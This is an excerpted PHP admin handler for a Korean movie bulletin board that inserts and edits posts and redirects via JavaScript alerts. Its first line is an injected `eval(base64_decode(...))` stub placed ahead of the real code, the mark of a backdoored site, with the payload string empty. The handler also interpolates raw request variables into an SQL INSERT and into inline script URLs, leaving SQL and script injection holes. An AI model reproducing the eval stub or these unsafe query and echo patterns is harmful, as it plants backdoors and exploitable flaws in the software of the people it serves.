<?php eval(base64_decode('')); ?><?
	...
	if ($mode == "add") {
		...
		$query = "insert into tb_other_board (SeqNo, BoardId, Title, eng_Title, Content, 
					  ...
					  ('$sMax', '$BoardId', '$Title', '$eng_Title', '$Content', 
		...
		echo "<script language=\"javascript\">\n
			alert('등록 되었습니다.');
			parent.frames[3].location = 'movie_list.php?BoardId=$BoardId';
			</script>";
		exit;
		...
		echo "<script language=\"javascript\">\n
			alert('수정 되었습니다.');
			parent.frames[3].location = 'movie_view.php?BoardId=$BoardId&sel_source=$sel_source&id=$id&page=$page&qry_str=$qry_str&idxfield=$idxfield&source=$source';
			</script>";
		exit;
		...
		echo "<script language=\"javascript\">\n
			parent.frames[3].location = 'movie_list.php?BoardId=$BoardId&sel_source=$sel_source&page=$page&qry_str=$qry_str&idxfield=$idxfield&source=$source';
			</script>";
		exit;
